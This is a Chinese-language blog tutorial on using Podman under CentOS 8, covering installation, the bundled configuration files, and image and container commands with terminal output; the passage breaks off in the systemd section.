    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS8 在9月24号正式 Release 了，比 RHEL8 要推迟了4个月。这次的更新感觉比 CentOS7 的更新要来的重要，内核更新到了4.x，网络管理彻底替换了 network.service，防火墙管理等等，还包括去除了 Docker 作为默认的容器化管理工具，使用 Podman、Buildah、Skopeo 进行了替换，这里来体验下 Podman。</p><p>本篇文章所有环境基于 CentOS8。</p><h2 id="Podman"><a href="#Podman" class="headerlink" title="Podman"></a>Podman</h2><p>为啥不用 Docker 了？我个人觉得 Docker 目前使用上最大的问题就是需要运行一个守护进程，虽然需要 root 用户也是一个问题，但是对于我个人来说还好。随着 K8S 定义 CRI 标准，且 Docker 的稳定性一直是个问题（虽然最近有在往好的趋势发展），但越来越多人使用 CRI-O 来替代 Docker，Docker 在被大家所抛弃（- - </p><p>Podman 创建的容器不需要守护进程，且可以用普通用户创建容器。Podman 中的大部分命令的使用方式与 Docker 相同，可以看左 <code>alias docker=podman</code> 。</p><p>Podman 的缺点：</p><ol><li>仅在 Linux 下支持，无法像 Docker 一样支持 Windows 和 MacOS</li><li>缺少 docker-compose 工具替代品，哪怕有 k8s Pod 概念（虽然有 <a href="https://github.com/containers/podman-compose" target="_blank" rel="noopener">podman-compose</a>，但是他还没有release 1.0版本，使用需谨慎</li><li>更新频繁（使用这类工具是有些心累的。。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Podman 可以直接使用 <code>dnf</code> 继续安装，需要注意的是，在 CentOS 中 Podman 依赖于 containers-common，这里会附带很多配置信息到 <code>/etc/containers</code>，后续会用到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo dnf install podman                      </span><br><span class="line">Last metadata expiration check: 0:03:31 ago on Wed 02 Oct 2019 11:57:25 AM CST.</span><br><span class="line">Package podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.x86_64 is already installed.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">Nothing to <span class="keyword">do</span>.</span><br><span class="line">Complete!</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ dnf info podman        </span><br><span class="line">Installed Packages</span><br><span class="line">Name         : podman</span><br><span class="line">Version      : 1.0.0</span><br><span class="line">Release      : 2.git921f98f.module_el8.0.0+58+91b614e7</span><br><span class="line">Arch         : x86_64</span><br><span class="line">Size         : 37 M</span><br><span class="line">Source       : podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.src.rpm</span><br><span class="line">Repo         : @System</span><br><span class="line">From repo    : AppStream</span><br><span class="line">Summary      : Manage Pods, Containers and Container Images</span><br><span class="line">URL          : https://github.com/containers/libpod</span><br><span class="line">License      : ASL 2.0</span><br><span class="line">Description  : Manage Pods, Containers and Container Images</span><br><span class="line">             : libpod provides a library <span class="keyword">for</span> applications looking to use</span><br><span class="line">             : the Container Pod concept popularized by Kubernetes.</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>安装完成后，来看下 Podman RPM 中附带了些什么文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ rpm -ql podman  |grep -v <span class="string">'/usr/share/man/'</span>  <span class="comment"># 去除 man 手册中内容</span></span><br><span class="line">/etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">/usr/bin/podman</span><br><span class="line">/usr/lib/.build-id</span><br><span class="line">/usr/lib/.build-id/37</span><br><span class="line">/usr/lib/.build-id/37/e7f04d352e5dbde603e9701baedb0b1be6bc37</span><br><span class="line">/usr/lib/.build-id/9a</span><br><span class="line">/usr/lib/.build-id/9a/2b43332ca5756f9e2a086bae9b953009ef5a37</span><br><span class="line">/usr/lib/systemd/system/io.podman.service</span><br><span class="line">/usr/lib/systemd/system/io.podman.socket</span><br><span class="line">/usr/lib/tmpfiles.d/podman.conf</span><br><span class="line">/usr/libexec/podman/conmon</span><br><span class="line">/usr/share/bash-completion/completions/podman</span><br><span class="line">/usr/share/containers/libpod.conf</span><br><span class="line">/usr/share/licenses/podman</span><br><span class="line">/usr/share/licenses/podman/LICENSE</span><br></pre></td></tr></table></figure><p>可以看到只有一个配置文件是在 <code>/etc/cni</code> 路径下的，与 Bridge 的配置有关：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"cniVersion"</span>: <span class="string">"0.3.0"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"podman"</span>,</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"bridge"</span>,</span><br><span class="line">        <span class="string">"bridge"</span>: <span class="string">"cni0"</span>,</span><br><span class="line">        <span class="string">"isGateway"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipMasq"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipam"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"host-local"</span>,</span><br><span class="line">            <span class="string">"subnet"</span>: <span class="string">"10.88.0.0/16"</span>,</span><br><span class="line">            <span class="string">"routes"</span>: [</span><br><span class="line">                &#123; <span class="string">"dst"</span>: <span class="string">"0.0.0.0/0"</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"portmap"</span>,</span><br><span class="line">        <span class="string">"capabilities"</span>: &#123;</span><br><span class="line">          <span class="string">"portMappings"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面我们有提到，Podman 依赖的 containers-common RPM 中包含了很多配置文件，我们一个一个的来看一下：</p><h4 id="registries-conf"><a href="#registries-conf" class="headerlink" title="registries.conf"></a>registries.conf</h4><p>/etc/containers/registries.conf 用于保存 registries 相关配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/registries.conf         </span><br><span class="line"><span class="comment"># This is a system-wide configuration file used to</span></span><br><span class="line"><span class="comment"># keep track of registries for various container backends.</span></span><br><span class="line"><span class="comment"># It adheres to TOML format and does not support recursive</span></span><br><span class="line"><span class="comment"># lists of registries.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The default location for this configuration file is /etc/containers/registries.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The only valid categories are: 'registries.search', 'registries.insecure', </span></span><br><span class="line"><span class="comment"># and 'registries.block'.</span></span><br><span class="line"></span><br><span class="line">[registries.search]</span><br><span class="line">registries = [<span class="string">'registry.redhat.io'</span>, <span class="string">'quay.io'</span>, <span class="string">'docker.io'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to access insecure registries, add the registry's fully-qualified name.</span></span><br><span class="line"><span class="comment"># An insecure registry is one that does not have a valid SSL certificate or only does HTTP.</span></span><br><span class="line">[registries.insecure]</span><br><span class="line">registries = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to block pull access from a registry, uncomment the section below</span></span><br><span class="line"><span class="comment"># and add the registries fully-qualified name.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Docker only</span></span><br><span class="line">[registries.block]</span><br><span class="line">registries = []</span><br></pre></td></tr></table></figure><h4 id="mounts-conf"><a href="#mounts-conf" class="headerlink" title="mounts.conf"></a>mounts.conf</h4><p><code>/usr/share/containers/mounts.conf</code> 在执行 <code>podman run</code> 或者 <code>podman build</code> 命令时自动挂载的路径，该路径只会在容器运行时挂载，不会提交到容器镜像中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/mounts.conf                               </span><br><span class="line">/usr/share/rhel/secrets:/run/secrets</span><br></pre></td></tr></table></figure><h4 id="seccomp-json"><a href="#seccomp-json" class="headerlink" title="seccomp.json"></a>seccomp.json</h4><p><code>/usr/share/containers/seccomp.json</code> 是容器内允许的 seccomp 规则白名单。 seccomp（secure computing）是一种安全保护机制，一般情况下，程序可以使用所有的 syscall，但是为了避免安全问题发生，通常会指定相应的规则来保证。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/seccomp.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"defaultAction"</span>: <span class="string">"SCMP_ACT_ERRNO"</span>,</span><br><span class="line"><span class="string">"archMap"</span>: [...],</span><br><span class="line"><span class="string">"syscalls"</span>: [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="policy-json"><a href="#policy-json" class="headerlink" title="policy.json"></a>policy.json</h4><p><code>/etc/containers/policy.json</code>  证书安全相关配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/policy.json      </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"default"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"insecureAcceptAnything"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"transports"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"docker-daemon"</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">""</span>: [&#123;<span class="string">"type"</span>:<span class="string">"insecureAcceptAnything"</span>&#125;]</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h4><h5 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ <span class="built_in">pwd</span>                                                                                                                                  1 ↵</span><br><span class="line">/home/yiran/podman/hello</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat Dockerfile </span><br><span class="line">FROM docker.io/library/centos:latest</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman build -t hello:1.0 .    </span><br><span class="line">STEP 1: FROM docker.io/library/centos:latest</span><br><span class="line">STEP 2: RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">hello</span><br><span class="line">--&gt; 895ce449f0b3f1f2d8a0d2dca280cb46f4c69bb2824c93bb0e72eb49987c9050</span><br><span class="line">STEP 3: COMMIT hello:1.0</span><br><span class="line">--&gt; 618f931bc244f2eaff53d9f2bcb1df97c5ddac501088d5919450a57f995173af</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman images               </span><br><span class="line">REPOSITORY                             TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/hello                        1.0      618f931bc244   8 seconds ago    210 MB</span><br><span class="line">&lt;none&gt;                                 &lt;none&gt;   895ce449f0b3   13 seconds ago   210 MB</span><br><span class="line">docker.io/library/nginx                latest   f949e7d76d63   2 weeks ago      130 MB</span><br><span class="line">docker.io/library/centos               latest   67fa590cfc1c   7 weeks ago      210 MB</span><br><span class="line">registry.fedoraproject.org/f27/httpd   latest   18f01f6f77ef   15 months ago    426 MB</span><br></pre></td></tr></table></figure><h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman search mongo |head -n 5</span><br><span class="line">INDEX       NAME                                                 DESCRIPTION                                       STARS   OFFICIAL   AUTOMATED</span><br><span class="line">quay.io     quay.io/hellofresh/delete-old-ahoy-mongo-dbs                                                           0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo-34                                                                   0                  </span><br><span class="line">quay.io     quay.io/utilitywarehouse/mongo-burs                                                                    0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo                                                                      0</span><br></pre></td></tr></table></figure><h5 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image pull nginx</span><br><span class="line">Trying to pull registry.redhat.io/nginx:latest...Failed</span><br><span class="line">Trying to pull quay.io/nginx:latest...Failed</span><br><span class="line">Trying to pull docker.io/nginx:latest...Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob b8f262c62ec6: 25.84 MiB / 25.84 MiB [=========================] 13s</span><br><span class="line">Copying blob e9218e8f93b1: 22.48 MiB / 22.48 MiB [=========================] 13s</span><br><span class="line">Copying blob 7acba7289aa3: 202 B / 202 B [=================================] 13s</span><br><span class="line">Copying config f949e7d76d63: 6.51 KiB / 6.51 KiB [==========================] 0s</span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br></pre></td></tr></table></figure><p>除了像 Docker 一样从网络拉取镜像，Podman 为了方便用户从 Docker 迁移过来，Podman 支持从本地的 docker daemon 中直接拉取镜像，如果没有 domain 的话，目前会自动补全 <code>docker.io/library/</code> 前缀。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ docker images |grep yiran</span><br><span class="line">harbor.yiran.com/yiran_tuna/leader-elector                                   0.5                           129c97fdb20d        3 years ago         169MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman pull docker-daemon:harbor.yiran.com/yiran_tuna/leader-elector:0.5</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob bf87964bccfd <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 3efb68385a82 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 42755cf4ee95 <span class="keyword">done</span></span><br><span class="line">Copying blob ce31f2e01592 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config 129c97fdb2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">129c97fdb20d5fb7a0c569994f710c2b0d5292219f189f4f66c313f7bed9f434</span><br></pre></td></tr></table></figure><p>看上去一切都很美好，但是要注意下面这种错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERRO[0005] Error pulling image ref //testimg:latest: Error committing the finished image: error adding layer with blob &quot;sha256:caed8f108bf6721dc2709407ecad964c83a31c8008a6a21826aa4ab995df5502&quot;: Error processing tar file(exit status 1): there might not be enough IDs available in the namespace (requested 4000000:4000000 for /testfile): lchown /testfile: invalid argument</span><br></pre></td></tr></table></figure><p>因为 Podman 可以用普通用户运行容器，平时操作时也都是普通用户，这时候我们就面临一个UID &amp; GID 映射的问题，默认的 subuid 的上限是 65536，这个可以自己做相应的调整：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subuid</span><br><span class="line">yiran:100000:65536</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subgid</span><br><span class="line">yiran:100000:65536</span><br></pre></td></tr></table></figure><p>不只是在镜像拉取过程中，在操作文件时，也需要关注 UID &amp; GID 的问题，这个是之前使用 Docker 忽略的点。</p><h5 id="列出"><a href="#列出" class="headerlink" title="列出"></a>列出</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/nginx    latest   f949e7d76d63   7 days ago    130 MB</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure><h5 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image inspect docker.io/library/nginx |head -n 10</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043"</span>,</span><br><span class="line">        <span class="string">"Digest"</span>: <span class="string">"sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx:latest"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx@sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span></span><br><span class="line">        ],</span><br></pre></td></tr></table></figure><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image rm docker.io/library/nginx                 </span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                          </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure><h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                             </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman run -it docker.io/library/centos sh</span><br><span class="line">sh-4.2<span class="comment"># cat /etc/centos-release</span></span><br><span class="line">CentOS Linux release 7.6.1810 (Core) </span><br><span class="line">sh-4.2<span class="comment"># exit</span></span><br></pre></td></tr></table></figure><h5 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps                                                                                               </span><br><span class="line">[sudo] password <span class="keyword">for</span> yiran: </span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS            PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Up 8 minutes ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman stop af3d9001ad32</span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps               </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure><h5 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a</span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS                     PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Exited (0) 29 seconds ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman rm af3d9001ad32                                                                                       </span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a          </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure><h5 id="checkpoint-restore"><a href="#checkpoint-restore" class="headerlink" title="checkpoint/restore"></a>checkpoint/restore</h5><p>Podman 提供了类似于 git 的功能，能够对 container 进行 checkpoint(commit)，并且可以 restore(checkout)，虽然 <a href="https://podman.io/blogs/2018/10/10/checkpoint-restore.html" target="_blank" rel="noopener">demo 视频</a> 很美好，但是我本地想通过快照（虚拟化功能）的方式来验证，却发现因为 CRIU 的版本过低不支持该功能，等后续深度使用后再研究下这个功能的原理。</p><h5 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h5><p>Podman 1.2.0 版本提供了 healthcheck 功能，我们在运行容器时，可以通过参数 <code>--healthcheck-command</code> 来指定健康检查的方式，然后通过 <code>podman healthcheck</code> 命令来检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo podman run -dt --name hc1 --healthcheck-command <span class="string">'CMD-SHELL curl http://localhost || exit 1'</span> --healthcheck-interval=0 quay.io/libpod/alpine_nginx:latest</span><br><span class="line">d25ee6faaf6e5e12c09e734b1ac675385fe4d4e8b52504dd01a60e1b726e3edb</span><br><span class="line">$ sudo podman healthcheck run hc1</span><br><span class="line">Healthy</span><br><span class="line">$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><code>--healthcheck-command</code> 命令是在容器内执行的，所以我们需要保证容器镜像中存在相应命令； <code>--healthcheck-interval</code> 如果设置为 0 则不自动检查。</p><h5 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h5><p>由于 Podman 没有 daemon ，所以没办法像 docker 一样通过指定参数 <code>--restart=always</code> 在 docker 进程启动时自动拉起镜像。 Podman 通过 systemd 来支持该功能。</p><p>首先，我们需要准备一个已经可以正常运行的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman ps </span><br><span class="line">CONTAINER ID  IMAGE                                  COMMAND               CREATED                 STATUS                     PORTS  NAMES</span><br><span class="line">cf6b656d4ab0  docker.io/library/envoy:latest  /usr/bin/mongod -...  Less than a second ago  Up Less than a second ago         smtx-mongodb</span><br></pre></td></tr></table></figure><p>编写 systemd 配置文件，通常默认路径为： /usr/lib/systemd/system/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 